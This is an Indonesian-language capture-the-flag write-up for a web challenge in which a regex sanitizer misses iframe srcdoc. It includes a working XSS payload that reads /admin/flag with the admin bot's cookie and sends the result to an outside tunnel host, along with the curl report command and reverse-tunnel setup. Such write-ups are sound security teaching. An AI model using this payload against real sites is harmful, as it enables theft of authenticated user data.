# Trusted Rules

## Ringkas

Bug utamanya ada di `/view`. Input `rule` dimasukkan ke `innerHTML` setelah "sanitasi" regex yang cuma buang `<script>`, `javascript:`, dan atribut event handler. Itu masih bisa dibypass pakai `iframe srcdoc`, karena string di dalam `srcdoc` di-decode lagi jadi dokumen baru dan `<script>` di dalamnya tetap jalan.

Bot admin mengunjungi URL yang kita submit lewat `/report` selama host dan port cocok dengan `http://web:5000`. Endpoint `/report` sendiri me-rewrite `localhost` ke `web:5000`, jadi URL publik `http://localhost:5000/...` tetap diterima bot.

## Analisis

Potongan penting di template:

```html
safe = safe.replace(/<\/?script>/ig, '');
safe = safe.replace(/javascript:/ig, '');
safe = safe.replace(/on[a-z]+\s*=/ig, '');
document.getElementById('note-content').innerHTML = policy.createHTML(userNote);
```

Regex itu tidak menyentuh atribut `srcdoc`. Payload seperti ini masih lolos:

```html
<iframe srcdoc="&lt;script&gt;top.location='https://attacker/'&lt;/script&gt;"></iframe>
```

Saat browser merender `iframe`, isi `srcdoc` dibuka sebagai dokumen `about:srcdoc`. Script di dokumen itu bisa jalan dan tetap punya akses same-origin ke aplikasi utama, jadi `fetch('/admin/flag')` ikut membawa cookie `admin_session` milik bot.

## Langkah Eksploitasi

### 1. Siapkan endpoint penerima

Saya pakai HTTP server lokal dan reverse tunnel `localhost.run` supaya request dari bot bisa dicatat.

```bash
python3 -m http.server 8003
ssh -R 80:localhost:8003 nokey@localhost.run
```

Misal tunnel yang keluar:

```text
https://8edc256df28737.lhr.life
```

### 2. Buat payload XSS

Payload final:

```html
<iframe srcdoc="&lt;script&gt;fetch('/admin/flag').then(r=>r.text()).then(f=>top.location='https://8edc256df28737.lhr.life/'+encodeURIComponent(f))&lt;/script&gt;"></iframe>
```

URL yang dikirim ke `/report`:

```text
http://localhost:5000/view?rule=%3Ciframe%20srcdoc%3D%22%26lt%3Bscript%26gt%3Bfetch%28%27%2Fadmin%2Fflag%27%29.then%28r%3D%3Er.text%28%29%29.then%28f%3D%3Etop.location%3D%27https%3A%2F%2F8edc256df28737.lhr.life%2F%27%2BencodeURIComponent%28f%29%29%26lt%3B%2Fscript%26gt%3B%22%3E%3C%2Fiframe%3E
```

Kirim dengan:

```bash
curl -X POST https://web-trusted-rules.tracebash.xyz/report \
  --data-urlencode "url=http://localhost:5000/view?rule=%3Ciframe%20srcdoc%3D%22%26lt%3Bscript%26gt%3Bfetch%28%27%2Fadmin%2Fflag%27%29.then%28r%3D%3Er.text%28%29%29.then%28f%3D%3Etop.location%3D%27https%3A%2F%2F8edc256df28737.lhr.life%2F%27%2BencodeURIComponent%28f%29%29%26lt%3B%2Fscript%26gt%3B%22%3E%3C%2Fiframe%3E"
```

### 3. Ambil flag dari log request

Bot membuka note, script di `srcdoc` jalan, lalu browser admin navigasi ke tunnel dengan path berisi flag yang sudah di-URL-encode.

Log yang masuk:

```text
GET /TBCTF%7Brules_c4n_b3_byp4ss3d_1f_y0u_kn0w_h0w%7D
```

Decode path itu menghasilkan:

```text
TBCTF{rules_c4n_b3_byp4ss3d_1f_y0u_kn0w_h0w}
```

## Flag

```text
TBCTF{rules_c4n_b3_byp4ss3d_1f_y0u_kn0w_h0w}
```
